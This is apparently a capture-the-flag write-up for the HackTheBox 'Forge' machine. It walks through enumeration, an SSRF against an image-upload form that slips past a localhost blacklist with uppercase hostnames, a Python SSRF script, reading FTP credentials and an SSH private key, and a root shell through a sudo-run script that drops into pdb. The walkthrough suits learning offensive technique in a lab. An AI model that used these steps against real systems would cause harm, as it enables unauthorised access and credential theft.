# Forge

- Target Machine: 10.10.11.111

## Enumeration

### nmap scan

```bash
# Nmap 7.92SVN scan initiated Thu Sep 16 11:24:06 2021 as: nmap -sC -sV -oN nmap/initial -v 10.10.11.111
Nmap scan report for 10.10.11.111
Host is up (0.038s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)
|   256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)
|_  256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)
80/tcp open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Did not follow redirect to http://forge.htb
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/local/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Sep 16 11:24:29 2021 -- 1 IP address (1 host up) scanned in 23.63 seconds
```

We can see that the IP gets translated to the DNS `http://forge.htb`

## gobuster scan

```log
/uploads              (Status: 301) [Size: 224] [--> http://forge.htb/uploads/]
/upload               (Status: 200) [Size: 929]
/static               (Status: 301) [Size: 307] [--> http://forge.htb/static/]
/.                    (Status: 200) [Size: 2050]
/server-status        (Status: 403) [Size: 274]
```

After opening the webapp /upload page, we get a form where we can upload images both from our files and from an external url. After uploading the image, we are given an URL where we can check said image. Sadly, uploading a reverse shell won't work due to the browser forcing the file to be loaded as an image.

However, by using `cURL` on the output URL we can still see the contents of the uploaded file. We could try to exploit this with an SSRF, making the server upload it's own pages as an image and then read it's contents with cURL.

After testing this exploit by using `http://localhost` as the external image URL, we get an error message saying that the given URL has been blacklisted. The same goes for `http://forge.htb` and `http://127.0.0.1`.
We have to find a way to bypass this filtering. A very common and stupid way to bypass this types of filtering is to write the URL using uppercase letters. Testing with `http://Localhost` seems to do the trick. Anyhow, we still can't get information out of this exploit due to the server having difficulties to parse the URL (i.e. using `http://Localhost/upload` will generate an error instead of uploading the upload page).

## vhost scan

So far we have found a way to get the contents of the homepage of one of the website's know URL, but the default `http://forge.htb` page doesn't contain anything usefull. But what if there are other vhosts on this machine with a proper DNS?

```bash
[exyss@exyss Forge]$ gobuster vhost -u forge.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster/vhost_scan | grep -v "Status: 302"
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://forge.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2021/09/16 13:21:53 Starting gobuster in VHOST enumeration mode
===============================================================
Found: admin.forge.htb (Status: 200) [Size: 27]        
                                                                         
===============================================================
2021/09/16 13:22:17 Finished
===============================================================
```

Looks like we found the vhost `admin.forge.htb`. After opening this page in the browser, we get prompted with the message "Only localhost can access this page". Looks like now we know what to exploit with our SSRF :). Let's write a simple python script to run that easily:

```
import requests as req
from sys import argv

url = "http://forge.htb/"

if not argv[1]:
    print(f"Usage: python {argv[0]} <payload>")

else:
    # Run SSRF
    payload = {
        "url": argv[1],
        "remote": 1
    }

    r = req.post(f"{url}/upload", data = payload)
    up_file = r.text.split("http://forge.htb/uploads/")[1][:-2]

    # Get results
    r = req.get(f"{url}/uploads/{up_file}", data = payload)
    print(r.text)
```

Running this scripts gives the following result:

```html
[exyss@exyss scripts]$ python access_admin.py http://admin.FORGE.htb
<!DOCTYPE html>
<html>
<head>
    <title>Admin Portal</title>
</head>
<body>
    <link rel="stylesheet" type="text/css" href="/static/css/main.css">
    <header>
            <nav>
                <h1 class=""><a href="/">Portal home</a></h1>
                <h1 class="align-right margin-right"><a href="/announcements">Announcements</a></h1>
                <h1 class="align-right"><a href="/upload">Upload image</a></h1>
            </nav>
    </header>
    <br><br><br><br>
    <br><br><br><br>
    <center><h1>Welcome Admins!</h1></center>
</body>
</html>

[exyss@exyss scripts]$ 
```

We can see that there are two pages under this URL. Let's first check the /announcements page.

```html
[exyss@exyss scripts]$ python access_admin.py http://admin.FORGE.htb/announcements
...
<ul>
        <li>An internal ftp server has been setup with credentials as user:heightofsecurity123!</li>
        <li>The /upload endpoint now supports ftp, ftps, http and https protocols for uploading from url.</li>
        <li>The /upload endpoint has been configured for easy scripting of uploads, and for uploading an image, one can simply pass a url with ?u=&lt;url&gt;.</li>
    </ul>
```

Combining the three announcements, we get what we need to forge the next payload

```bash
[exyss@exyss scripts]$ python access_admin.py http://admin.FORGE.htb/upload?u=ftp://user:heightofsecurity123\!@127.0.1.1
-rwxrwxr-x    1 1000     1000           20 Sep 16 12:21 df
drwxr-xr-x    3 1000     1000         4096 Aug 04 19:23 snap
-rw-r-----    1 0        1000           33 Sep 16 11:08 user.txt
```

## Priviledge escalation

We can use the FTP connection to get the user's SSH private key and then use it to login.

```bash
[exyss@exyss scripts]$ python access_admin.py http://admin.FORGE.htb/upload?u=ftp://user:heightofsecurity123\!@127.0.1.1/.ssh/id_rsa > user_ssh_key


[exyss@exyss scripts]$ chmod 600 user_ssh_key

[exyss@exyss scripts]$ ssh -i user_ssh_key user@forge.htb

user@forge:~$ sudo -l
Matching Defaults entries for user on forge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands on forge:
    (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py

user@forge:~$ cat /opt/remote-manage.py
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            if option == 1:
                clientsock.send(subprocess.getoutput('ps aux').encode())
            elif option == 2:
                clientsock.send(subprocess.getoutput('df').encode())
            elif option == 3:
                clientsock.send(subprocess.getoutput('ss -lnt').encode())
            elif option == 4:
                clientsock.send(b'Bye\n')
                break
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```

As we can see, the user is allowed to run `sudo /usr/bin/python3 /opt/remote-manage.py` without password.
By looking through the given code, we can see that when an error is thrown the program will spawn a Python Debugger (PDB). Once the PDB is spawned, we can simply import the OS module and spawn a root shell.

In this case, to make the program throw an error we have to just input a string when we're answered to enter a number. You'll need two terminal tabs to achieve this.

```bash
# ON THE FIRST TAB
user@forge:~$ sudo /usr/bin/python3 /opt/remote-manage.py
Listening on localhost:49619

# ON THE SECOND TAB
user@forge:~$ nc localhost 49619
Enter the secret passsword: secretadminpassword
Welcome admin!

What do you wanna do: 
[1] View processes
[2] View free memory
[3] View listening sockets
[4] Quit
kaboom!

# AGAIN ON THE FIRST TAB
invalid literal for int() with base 10: b'kaboom!'
> /opt/remote-manage.py(27)<module>()
-> option = int(clientsock.recv(1024).strip())
(Pdb) import os
(Pdb) os.system("bash")

root@forge:/home/user# 
```